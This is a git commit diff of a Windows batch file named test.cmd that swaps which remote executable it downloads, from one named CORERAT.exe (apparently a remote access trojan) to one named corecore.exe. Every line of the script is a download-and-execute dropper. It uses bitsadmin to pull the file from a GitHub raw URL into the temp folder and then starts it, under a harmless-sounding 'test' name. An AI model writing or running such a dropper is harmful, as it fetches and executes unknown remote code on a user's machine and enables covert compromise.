ef116b6d297d6f90e64d411f4aefef8b7aaf182f
theCore034 <123981113+theCore034@users.noreply.github.com>
2024-02-15 00:24:05 +0100

    Update test.cmd

--- test.cmd
+++ test.cmd
@@ -1,6 +1,6 @@
 @echo off
-set url=https://raw.githubusercontent.com/theCore034/r32y43287436287423/main/CORERAT.exe
-set tempPath=%temp%\CORERAT.exe
+set url=https://raw.githubusercontent.com/theCore034/r32y43287436287423/main/corecore.exe
+set tempPath=%temp%\corecore.exe
 
 bitsadmin /transfer "DownloadJob" %url% %tempPath%
 start %tempPath%
